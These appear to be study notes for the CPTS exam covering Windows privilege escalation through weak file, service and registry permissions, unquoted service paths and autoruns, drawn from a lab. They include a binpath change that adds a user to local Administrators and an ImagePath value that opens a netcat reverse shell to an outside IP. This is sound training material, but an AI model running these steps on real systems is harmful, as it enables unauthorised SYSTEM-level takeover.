This section is **very important for CPTS** because weak permissions can turn a low-privileged foothold into **SYSTEM-level execution**. The core idea is: **find something privileged that your current user can modify, then understand what executes with that privileged context.** The source emphasizes that services commonly run as `SYSTEM`, making service-permission flaws particularly valuable.

---

## 1. The Big Picture

Think of Windows privilege escalation through weak permissions like this:

```text
Low-privileged user
       │
       ▼
Find privileged object
       │
       ├── Service binary is writable
       │
       ├── Service configuration is writable
       │
       ├── Service Registry key is writable
       │
       ├── Unquoted service path is exploitable
       │
       └── Startup/Autorun binary is writable
       │
       ▼
Object executes in privileged context
       │
       ▼
SYSTEM / Administrator
```

The most important question during enumeration is:

> **"What does my user have WRITE permission over that eventually executes as a more privileged user?"**

---

# 2. Permissive File System ACLs

## What is the vulnerability?

A service may execute a binary as `SYSTEM`, but the **binary itself may be writable by a normal user**.

Example:

```text
Service
   ↓
SecurityService.exe
   ↓
Runs as SYSTEM
```

If:

```text
Normal User → WRITE → SecurityService.exe
```

then you can potentially replace the executable.

When the service starts:

```text
SecurityService.exe
        ↓
executed by SYSTEM
        ↓
SYSTEM privileges
```

The source demonstrates using **SharpUp** to identify modifiable service binaries.

---

# 3. SharpUp — First Enumeration

Run:

```powershell
.\SharpUp.exe audit
```

SharpUp can identify:

```text
=== Modifiable Service Binaries ===
```

Example:

```text
Name             : SecurityService
DisplayName      : PC Security Management Service
State            : Stopped
StartMode        : Auto
PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

### What should immediately catch your attention?

```text
Modifiable Service Binaries
```

and:

```text
PathName
```

You now have to manually verify the permissions.

---

# 4. `icacls` — Verify File Permissions

Use:

```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

The lab output shows:

```text
BUILTIN\Users:(I)(F)
Everyone:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
```

The important part is:

```text
BUILTIN\Users:(I)(F)
Everyone:(I)(F)
```

`F` = **Full Control**

Therefore:

```text
Normal User
     │
     └── Full Control
             ↓
SecurityService.exe
             ↓
Service runs as SYSTEM
```

The source specifically notes that these permissions allow an unprivileged user to manipulate the directory and its contents.

---

# 5. Replacing a Service Binary

If the service is also startable by the unprivileged user, the attack chain becomes:

```text
Writable service executable
          +
Ability to start service
          ↓
Replace executable
          ↓
Start service
          ↓
Malicious executable executes
          ↓
SYSTEM
```

The source demonstrates backing up the original binary and replacing it with a malicious binary, which can provide a SYSTEM reverse shell or administrative control.

### CPTS takeaway

Don't stop at:

```text
"Binary is writable"
```

Check **both**:

1. Can I modify the binary?
    
2. Can I cause the service to execute it?
    

---

# 6. Weak Service Permissions

This is slightly different.

Previously:

```text
File permissions are weak
```

Now:

```text
Service permissions are weak
```

Example:

```text
WindscribeService
```

SharpUp identifies:

```text
=== Modifiable Services ===

Name       : WindscribeService
State      : Running
StartMode  : Auto
PathName   : C:\Program Files (x86)\Windscribe\WindscribeService.exe
```

---

# 7. AccessChk — Check Service ACLs

Use:

```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```

The flags are important:

|Flag|Meaning|
|---|---|
|`-q`|Omit banner|
|`-u`|Suppress errors|
|`-v`|Verbose|
|`-c`|Specify Windows service|
|`-w`|Show objects with write access|

The source's result shows:

```text
NT AUTHORITY\SYSTEM
    SERVICE_ALL_ACCESS

BUILTIN\Administrators
    SERVICE_ALL_ACCESS

NT AUTHORITY\Authenticated Users
    SERVICE_ALL_ACCESS
```

The critical entry is:

```text
Authenticated Users
        ↓
SERVICE_ALL_ACCESS
```

That means authenticated users have extensive control over the service configuration.

---

# 8. Verify Your Current Privileges

Before exploiting anything, check:

```cmd
net localgroup administrators
```

Example:

```text
Members
----------------
Administrator
mrb3n
```

If your account isn't there, you're still a normal user.

---

# 9. Modify `binpath`

If your account has sufficient service permissions:

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Output:

```text
[SC] ChangeServiceConfig SUCCESS
```

The important concept is:

```text
Service configuration
        ↓
binpath
        ↓
command controlled by attacker
```

The source explicitly notes that the binary path could instead point to an executable such as a reverse-shell binary.

---

# 10. Stop the Service

```cmd
sc stop WindscribeService
```

You want the modified `binpath` to execute when the service starts again.

The source shows the service entering:

```text
STOP_PENDING
```

---

# 11. Start the Service

```cmd
sc start WindscribeService
```

You may receive:

```text
[SC] StartService FAILED 1053
```

### 🚨 VERY IMPORTANT CPTS POINT

**1053 does NOT necessarily mean your command failed to execute.**

The source explains that the modified command can execute first, after which the Service Control Manager reports an error because:

```text
binpath ≠ actual Windows service executable
```

So:

```text
1053
   ≠
"Nothing happened"
```

Instead:

```text
Service starts
      ↓
binpath command executes
      ↓
command completes
      ↓
SCM expects a real service
      ↓
No proper service response
      ↓
1053
```

This is a very useful lab/exam concept.

---

# 12. Verify Privilege Escalation

Run:

```cmd
net localgroup administrators
```

Now:

```text
Administrator
htb-student
mrb3n
```

Your account has been added to the local Administrators group.

Then you can establish a new administrative context as appropriate for the lab.

---

# 13. Important Real-World Example — UsoSvc

The source also discusses:

```text
UsoSvc
```

Windows Update Orchestrator Service.

It runs as:

```text
NT AUTHORITY\SYSTEM
```

The source notes that **before the patch associated with CVE-2019-1322**, weak permissions allowed service accounts to modify the service binary path and potentially elevate to SYSTEM.

### CPTS lesson

When you encounter an interesting service:

```text
Who runs it?
     ↓
What can I modify?
     ↓
Can I start/stop it?
     ↓
What happens when it starts?
```

---

# 14. Cleanup

After modifying a service, restore it.

Example:

```cmd
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

Then:

```cmd
sc start WindScribeService
```

And:

```cmd
sc query WindScribeService
```

You want:

```text
STATE : 4  Running
```

The source demonstrates restoring the original path and confirming the service is running normally again.

### Professional pentest habit

Always clean up:

```text
Exploit
  ↓
Get access
  ↓
Document
  ↓
Restore configuration
  ↓
Verify normal operation
```

---

# 15. Unquoted Service Paths

This is another classic Windows privilege-escalation concept.

Suppose a service has:

```text
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

but the path isn't enclosed in quotes.

Windows may interpret the path progressively.

The source gives these candidate locations:

```text
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

---

## Why?

Given:

```text
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows has to determine what executable is intended.

It may test earlier path components before reaching the complete path.

Conceptually:

```text
C:\Program.exe
      ↓
C:\Program Files.exe
      ↓
C:\Program Files (x86)\System.exe
      ↓
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

---

# 16. But Unquoted ≠ Automatically Exploitable

This is **very important**.

Finding:

```text
Unquoted service path
```

doesn't automatically mean:

```text
SYSTEM
```

The source explicitly explains that creating files such as:

```text
C:\Program.exe
```

or:

```text
C:\Program Files (x86)\System.exe
```

usually requires administrative permissions.

It also notes that the attacker may not be able to restart the service and may need to wait for a system restart.

### CPTS mental model

```text
Unquoted path
      ↓
Can I write to an earlier path?
      ↓
Can I get the service to start?
      ↓
What account does it run as?
      ↓
Potential exploitation
```

So don't blindly exploit every unquoted path.

---

# 17. Find Unquoted Service Paths

The source gives:

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

This searches for services that:

- start automatically
    
- aren't standard Windows paths
    
- have paths without quotes
    

Example results:

```text
GVFS.Service
System Explorer Service
WindscribeService
```

---

# 18. Query a Service

Use:

```cmd
sc qc SystemExplorerHelpService
```

Important fields:

```text
START_TYPE          : 2 AUTO_START
BINARY_PATH_NAME    : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
SERVICE_START_NAME  : LocalSystem
```

The last field is extremely important:

```text
SERVICE_START_NAME : LocalSystem
```

because it tells you the security context in which the service executes.

---

# 19. Permissive Registry ACLs

Don't limit your search to files.

Windows services are also represented in the Registry:

```text
HKLM\SYSTEM\CurrentControlSet\Services
```

The source demonstrates checking service registry permissions using:

```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

Result:

```text
RW HKLM\System\CurrentControlSet\services\ModelManagerService
    KEY_ALL_ACCESS
```

---

# 20. Registry → Service `ImagePath`

A particularly interesting registry value is:

```text
ImagePath
```

It determines the executable/command associated with the service.

The source demonstrates changing it with:

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

### Attack chain

```text
Weak Registry ACL
       ↓
Write access to service key
       ↓
Modify ImagePath
       ↓
Restart service
       ↓
Service executes attacker-controlled command
       ↓
Privileged context
```

---

# 21. Modifiable Registry Autorun Binary

The final concept is **autorun/startup programs**.

Windows can automatically execute programs when a user logs in.

The source uses:

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

Example:

```text
Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n
```

---

# 22. Autorun Privilege Escalation Logic

The key isn't merely:

```text
"There's an autorun."
```

The key is:

```text
Who executes it?
       ↓
Can I modify the Registry entry?
       ↓
Can I overwrite the referenced binary?
       ↓
When does the privileged user log in?
```

For example:

```text
Privileged user
      ↓
logs in
      ↓
Windows reads Run key
      ↓
launches binary
      ↓
binary is attacker-controlled
      ↓
execution in privileged user's context
```

The source specifically notes that if you can write to the registry for an autorun binary or overwrite the binary itself, privilege escalation may occur when that user next logs in.

---

# 🔥 CPTS Weak Permissions Checklist

When you obtain a Windows shell, think:

```text
                    WEAK PERMISSIONS
                           │
          ┌────────────────┼─────────────────┐
          │                │                 │
       FILE ACL        SERVICE ACL       REGISTRY ACL
          │                │                 │
          ▼                ▼                 ▼
   Writable binary   SERVICE_ALL_ACCESS   KEY_ALL_ACCESS
          │                │                 │
          ▼                ▼                 ▼
     Replace EXE       Modify binPath    Modify ImagePath
          │                │                 │
          └────────────────┼─────────────────┘
                           ▼
                     Execute as SYSTEM
```

Then separately:

```text
UNQUOTED SERVICE PATH
        ↓
Can I write an earlier path?
        ↓
Can service restart?
        ↓
SYSTEM execution?

AUTORUN
        ↓
Who executes it?
        ↓
Can I modify Registry/binary?
        ↓
Privileged logon
        ↓
Execution
```

---

# 🧠 What You Should Memorize for CPTS

### 1. File permissions

```cmd
icacls <file>
```

Look for:

```text
Users:(F)
Everyone:(F)
Users:(M)
Everyone:(M)
```

---

### 2. Find modifiable service binaries

```cmd
SharpUp.exe audit
```

Look for:

```text
Modifiable Service Binaries
```

---

### 3. Find modifiable services

```cmd
SharpUp.exe audit
```

Look for:

```text
Modifiable Services
```

---

### 4. Check service ACL

```cmd
accesschk.exe /accepteula -quvcw <ServiceName>
```

Look for:

```text
SERVICE_ALL_ACCESS
```

---

### 5. Query service configuration

```cmd
sc qc <ServiceName>
```

Especially:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
START_TYPE
```

---

### 6. Change service configuration

```cmd
sc config <ServiceName> binpath="<command>"
```

---

### 7. Stop/start

```cmd
sc stop <ServiceName>
sc start <ServiceName>
```

Remember:

```text
1053 ≠ necessarily failure of your command
```

---

### 8. Verify admin membership

```cmd
net localgroup administrators
```

---

### 9. Search unquoted paths

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

---

### 10. Check service Registry ACLs

```cmd
accesschk.exe /accepteula "<username>" -kvuqsw hklm\System\CurrentControlSet\services
```

---

### 11. Enumerate autoruns

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

---

# 🎯 The Most Important CPTS Mental Model

Don't memorize exploitation commands first.

Memorize this:

```text
1. What is privileged?
        ↓
2. What executes as SYSTEM/admin?
        ↓
3. What controls that execution?
        ↓
4. Do I have WRITE permission?
        ↓
5. Can I trigger execution?
        ↓
6. What context will it execute in?
        ↓
7. Verify privilege escalation
        ↓
8. Clean up
```

For services specifically:

```text
             SERVICE
                │
       ┌────────┼─────────┐
       │        │         │
    Binary   Config    Registry
       │        │         │
    icacls   sc config  ImagePath
       │        │         │
       └────────┼─────────┘
                ▼
        Can I control execution?
                │
                ▼
       What account runs it?
                │
                ▼
       SYSTEM / privileged user
```

**CPTS priority:** focus especially on the distinction between **writable service binary**, **writable service configuration**, **writable service Registry key**, and **unquoted service path**. They look similar during enumeration, but the actual exploitation condition is different for each.